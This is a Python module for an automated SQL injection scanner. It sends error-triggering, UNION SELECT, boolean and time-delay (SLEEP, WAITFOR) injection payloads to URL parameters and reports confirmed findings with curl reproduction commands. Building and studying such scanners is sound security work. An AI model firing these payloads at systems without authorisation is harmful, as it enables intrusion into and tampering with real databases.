import time
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from scan_engine.helpers.http_client import get_session
from scan_engine.helpers.mutation_engine import MutationEngine
from scan_engine.helpers.discovery_accumulator import DiscoveryAccumulator

class SQLiExpert:
    """
    Wave 6: Deep SQLi Expert.
    Professional-grade inference engine for SQL Injection detection.
    Supports:
    - Boolean-based Inference (Differential analysis)
    - Error-based Fingerprinting
    - Time-based Verification (Temporal side-channels)
    """

    def __init__(self, options=None):
        self.options = options
        self.session = get_session(options)
        self.session.headers.update({"User-Agent": "RedOps3-SQLi-Expert/1.0"})
        
        # DB Error Regexes for Error-Based Detection
        self.error_signatures = {
            "MySQL": [r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\.", r"MariaDB server version"],
            "PostgreSQL": [r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\.", r"PostgreSQL query failed"],
            "Microsoft SQL Server": [r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"\bSQL Server.*Driver", r"\bWarning.*mssql_.*", r"\bSqlException", r"Unclosed quotation mark after the character string"],
            "Oracle": [r"\bORA-[0-9]{5}", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*", r"quoted string not properly terminated"],
            "SQLite": [r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SqliteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::"],
            "H2": [r"org\.h2\.jdbc\.JdbcSQLException", r"org\.h2\.message\.DbException", r"H2 JDBC Driver"],
            "Informix": [r"An illegal character has been found in the statement", r"com\.informix\.jdbc"],
            "MariaDB": [r"check the manual that corresponds to your MariaDB server version"]
        }

    def scan(self, base_url, scan_id, urls=None, logger=None, quick=True):
        """Main entry point for SQLi Expert matrix."""
        if logger: logger(f"SQLi Expert: Engaging Inference Engine on {base_url}", "INFO")
        
        findings = []
        # Gather all seeds
        seeds = urls if urls else [base_url]
        
        # Filter for URLs with parameters or likely injection points
        test_queue = []
        for u in seeds:
            parsed = urlparse(u)
            if parsed.query:
                test_queue.append(u)
        
        if not test_queue:
            # If no params, try expanding with common ones (Wave 5 logic)
            # For now, we assume DiscoveryAccumulator has done its job
            pass

        if quick:
            test_queue = test_queue[:15]

        for url in test_queue:
            url_findings = self.audit_url(url, logger=logger)
            if url_findings:
                findings.extend(url_findings)

        return findings

    def audit_url(self, url, logger=None):
        """Performs multi-stage audit on a single URL's parameters."""
        findings = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param in params:
            # Stage 1: Error-Based Check (Fastest)
            error_res = self._check_error_based(url, param, logger)
            if error_res:
                findings.append(error_res)
                # Continue to Stage 2 to see if we can get a UNION PoC
            
            # Stage 2: Union-Based Extraction (OSCP Proof)
            union_res = self._check_union_based(url, param, logger)
            if union_res:
                findings.append(union_res)
                continue

            # Stage 3: Boolean-Based Inference (Differential)
            if not findings: # Only if error/union didn't give a clear signal
                bool_res = self._check_boolean_based(url, param, logger)
                if bool_res:
                    findings.append(bool_res)
                    continue

            # Stage 4: Time-Based Verification (Noisy/Slow)
            if not findings:
                time_res = self._check_time_based(url, param, logger)
                if time_res:
                    findings.append(time_res)
        
        return findings

    def _check_union_based(self, url, param, logger):
        """Discovers column count via ORDER BY and verifies reflection via UNION SELECT."""
        # 1. Column discovery via ORDER BY
        col_count = 0
        max_cols = 100 if not self.options or not self.options.get("quick") else 20
        for i in range(1, max_cols + 1):
            p = f"' ORDER BY {i}--"
            target_url = self._inject(url, param, p)
            try:
                resp = self.session.get(target_url, timeout=5, verify=False)
                # If we get an error or a significant change in response, the previous 'i' was the count
                # Some servers return 500, others 200 but with error message in body
                if resp.status_code != 200 or any(x in resp.text.lower() for x in ["unknown column", "order clause", "out of range"]):
                    col_count = i - 1
                    break
            except Exception:
                col_count = i - 1
                break
        
        if col_count > 0:
            if logger: logger(f"SQLi Expert: Found {col_count} columns via ORDER BY on param '{param}'", "INFO")
            
            # 2. Verify reflection via UNION SELECT
            magic_str = "REDOPS_SQLI_PROOF"
            for pos in range(1, col_count + 1):
                # Build UNION SELECT 1,2,'REDOPS_SQLI_PROOF',4...
                cols = [str(n) if n != pos else f"'{magic_str}'" for n in range(1, col_count + 1)]
                p = f"' UNION SELECT {','.join(cols)}--"
                target_url = self._inject(url, param, p)
                try:
                    resp = self.session.get(target_url, timeout=5, verify=False)
                    if magic_str in resp.text:
                        if logger: logger(f"🔥 SQLi SIGNAL (Union): Data reflection confirmed on col {pos} of {col_count}", "SUCCESS")
                        param_evidence = "Unknown"
                        try:
                            param_evidence = [line.strip()[:150] for line in resp.text.split('\n') if magic_str in line][0]
                        except Exception: pass
                        
                        return {
                            "title": "SQL Injection Detected (UNION-Based)",
                            "severity": "critical",
                            "confidence": "certain",
                            "description": f"Confirmed UNION-based SQL injection on the `{param}` parameter.\nAn attacker can use UNION SELECT statements to extract arbitrary data from the database.\n\n- **Column Count:** {col_count}\n- **Reflective Column:** {pos}\n- **Proof:** `{magic_str}` was successfully reflected in the HTML response.",
                            "url": target_url,
                            "endpoint": target_url,
                            "payload": p,
                            "parameter": param,
                            "tool_source": "sqli_expert",
                            "category": "sqli",
                            "repro_command": f"curl -ik \"{target_url}\"",
                            "evidence": {
                                "proof_string": magic_str,
                                "matched_snippet": param_evidence
                            },
                            "metadata": {
                                "technique": "union_based",
                                "columns": col_count,
                                "reflective_pos": pos,
                                "oscp_safe": True,
                                "validation_status": "success"
                            }
                        }
                except: pass
        return None

    def _check_error_based(self, url, param, logger):
        """Triggers DB errors using special characters with baseline validation."""
        # 0. Baseline check to avoid static error reflections (Hardening V6)
        try:
            baseline_resp = self.session.get(url, timeout=5, verify=False)
            baseline_text = baseline_resp.text if baseline_resp.status_code == 200 else ""
        except:
            baseline_text = ""

        payloads = ["'", "''", "\"", "')", "'))", "';"]
        for p in payloads:
            target_url = self._inject(url, param, p)
            try:
                resp = self.session.get(target_url, timeout=5, verify=False)
                for db_type, sigs in self.error_signatures.items():
                    for sig in sigs:
                        # Success condition: Signature matches AND wasn't there before
                        if re.search(sig, resp.text, re.IGNORECASE):
                            baseline_has_signature = bool(re.search(sig, baseline_text, re.IGNORECASE))
                            if logger:
                                logger(
                                    f"🔥 SQLi SIGNAL (Error): {db_type} signature observed on param '{param}'",
                                    "SUCCESS",
                                )
                            proof_snippet = "Unknown"
                            try:
                                proof_snippet = [line.strip()[:150] for line in resp.text.split('\n') if re.search(sig, line, re.IGNORECASE)][0]
                            except:
                                pass

                            if baseline_has_signature:
                                baseline_diff = "Signature was already present in baseline response; manual confirmation required."
                                confidence = "medium"
                                severity = "critical"
                                validation_status = "needs_manual_validation"
                            else:
                                baseline_diff = "Signature was absent in the clean baseline request."
                                confidence = "certain"
                                severity = "critical"
                                validation_status = "success"

                            return {
                                "title": f"SQL Injection Detected (Error-Based) - {db_type}",
                                "severity": severity,
                                "confidence": confidence,
                                "description": f"A database error confirming a {db_type} backend was triggered by injecting the character `{p}` into the `{param}` parameter.\n\nThis indicates the application is insecurely concatenating user input directly into SQL queries.",
                                "url": target_url,
                                "endpoint": target_url,
                                "payload": p,
                                "parameter": param,
                                "tool_source": "sqli_expert",
                                "category": "sqli",
                                "repro_command": f"curl -ik \"{target_url}\"",
                                "evidence": {
                                    "signature_matched": sig,
                                    "proof_snippet": proof_snippet,
                                    "baseline_diff": baseline_diff
                                },
                                "metadata": {
                                    "db_type": db_type,
                                    "technique": "error_based",
                                    "validation_status": validation_status,
                                }
                            }
            except Exception: pass
        return None

    def _check_boolean_based(self, url, param, logger):
        """Inferential detection via TRUE/FALSE logic with Stability Checks."""
        pairs = [
            ("' AND 1=1--", "' AND 1=2--"),
            ("\" AND 1=1--", "\" AND 1=2--"),
            (" AND 1=1", " AND 1=2"),
            ("') AND 1=1--", "') AND 1=2--"),
            ("')) AND 1=1--", "')) AND 1=2--")
        ]
        
        # 1. Stability Check: Verify baseline is stable
        try:
            r1 = self.session.get(url, timeout=5, verify=False)
            if r1.status_code != 200: return None
            time.sleep(0.2)
            r2 = self.session.get(url, timeout=5, verify=False)
            if len(r1.text) != len(r2.text):
                if logger: logger(f"SQLi Expert: Parameter '{param}' on {url} is unstable. Skipping boolean check.", "DEBUG")
                return None
            baseline_len = len(r1.text)
        except Exception: return None

        for p_true, p_false in pairs:
            try:
                url_true = self._inject(url, param, p_true)
                url_false = self._inject(url, param, p_false)
                
                resp_true = self.session.get(url_true, timeout=5, verify=False)
                if resp_true.status_code != 200: continue
                
                resp_false = self.session.get(url_false, timeout=5, verify=False)
                if resp_false.status_code != 200: continue
                
                len_true = len(resp_true.text)
                len_false = len(resp_false.text)
                
                # V12 Logic: 
                # 1. True response must be similar to baseline
                # 2. False response must differ from both TRUE and baseline
                
                true_to_baseline_diff = abs(len_true - baseline_len)
                false_to_true_diff = abs(len_true - len_false)
                
                # Thresholds: 1% for stability with baseline, 3% for anomaly with false
                if true_to_baseline_diff < (baseline_len * 0.01) and false_to_true_diff > (len_true * 0.03):
                    if logger: logger(f"🔥 SQLi SIGNAL (Boolean): Deterministic differential on param '{param}'", "SUCCESS")
                    return {
                        "title": "SQL Injection Detected (Boolean-Based Inferential)",
                        "severity": "critical",
                        "confidence": "certain",
                        "description": f"The application logic confirms SQL injection via rigorous boolean differential analysis on the `{param}` parameter.\n\n- The TRUE condition (`{p_true}`) returned a response matching the baseline.\n- The FALSE condition (`{p_false}`) substantially altered the response content, proving the injection modifies query logic execution.",
                        "url": url,
                        "endpoint": url,
                        "payload": p_true, # Using TRUE payload as the main one
                        "parameter": param,
                        "tool_source": "sqli_expert",
                        "category": "sqli",
                        "repro_command": f"# Compare these two requests:\ncurl -ik \"{url_true}\"\ncurl -ik \"{url_false}\"",
                        "evidence": {
                            "baseline_bytes": baseline_len,
                            "true_bytes": len_true,
                            "false_bytes": len_false,
                            "byte_difference_anomaly": false_to_true_diff
                        },
                        "metadata": {
                            "technique": "boolean_based", 
                            "diff_bytes": false_to_true_diff, 
                            "stable": True,
                            "validation_status": "success"
                        }
                    }
            except Exception: pass
        return None

    def _check_time_based(self, url, param, logger):
        """Verify via multi-sample temporal delay with baseline rejection."""
        # 5 second delay payloads
        payloads = [
            ("MySQL", "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"),
            ("PostgreSQL", "'||PG_SLEEP(5)--"),
            ("MSSQL", "'; WAITFOR DELAY '0:0:5'--"),
            ("Oracle", "'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),5)--"),
            ("Generic", "' AND 1=(SELECT 1 FROM (SELECT(SLEEP(5)))a)--")
        ]

        # 1. Stability Baseline
        try:
            start = time.time()
            self.session.get(url, timeout=10, verify=False)
            baseline_dur = time.time() - start
        except Exception: baseline_dur = 0

        for db_hint, p in payloads:
            target_url = self._inject(url, param, p)
            try:
                # FIRST SAMPLE (5s)
                start_s1 = time.time()
                self.session.get(target_url, timeout=15, verify=False)
                dur_s1 = time.time() - start_s1
                
                if dur_s1 >= 4.8: # Tolerance for 5s
                    if logger: logger(f"SQLi Expert: Preliminary time signal ({dur_s1:.1f}s) on '{param}'. Verifying...", "DEBUG")
                    
                    # SECOND SAMPLE (2s) - verification with different value
                    p_v2 = p.replace("(5)", "(2)").replace("'0:0:5'", "'0:0:2'")
                    target_url_v2 = self._inject(url, param, p_v2)
                    start_s2 = time.time()
                    self.session.get(target_url_v2, timeout=10, verify=False)
                    dur_s2 = time.time() - start_s2
                    
                    if 1.8 <= dur_s2 < 4.0: # Should be around 2s, definitely less than 5s
                        # FINAL POST-CHECK BASELINE (Should be fast)
                        start_last = time.time()
                        self.session.get(url, timeout=10, verify=False)
                        dur_last = time.time() - start_last
                        
                        if dur_last < 2.0 and dur_last < (dur_s2 * 0.8):
                            if logger: logger(f"🔥 SQLi SIGNAL (Time): Multi-sample delay confirmed on param '{param}' ({db_hint})", "SUCCESS")
                            return {
                                "title": f"SQL Injection Detected (Time-Based) - Probable {db_hint}",
                                "severity": "critical",
                                "confidence": "high",
                                "description": f"Verified time-based SQL injection on the `{param}` parameter using multi-sample temporal analysis.\n\n- Injected a **5s delay** which took `{dur_s1:.1f}s`.\n- Injected a **2s delay** which took `{dur_s2:.1f}s`.\n- The **baseline** request remained fast at `{dur_last:.1f}s`.\n\nThis confirms the database is executing dynamic time delay functions.",
                                "url": target_url,
                                "endpoint": target_url,
                                "payload": p,
                                "parameter": param,
                                "tool_source": "sqli_expert",
                                "category": "sqli",
                                "repro_command": f"time curl -ik \"{target_url}\"",
                                "evidence": {
                                    "baseline_response_time": dur_last,
                                    "payload_5_sec_delay_time": dur_s1,
                                    "payload_2_sec_delay_time": dur_s2
                                },
                                "metadata": {
                                    "technique": "time_based", 
                                    "samples": {"s1": dur_s1, "s2": dur_s2, "last": dur_last}, 
                                    "db_hint": db_hint,
                                    "validation_status": "success"
                                }
                            }
            except Exception: pass
        return None

    def _inject(self, url, param, payload):
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        # Append payload to existing value or replace
        original_vals = qs.get(param, [""])
        qs[param] = [v + payload for v in original_vals]
        new_query = urlencode(qs, doseq=True)
        return urlunparse(parsed._replace(query=new_query))
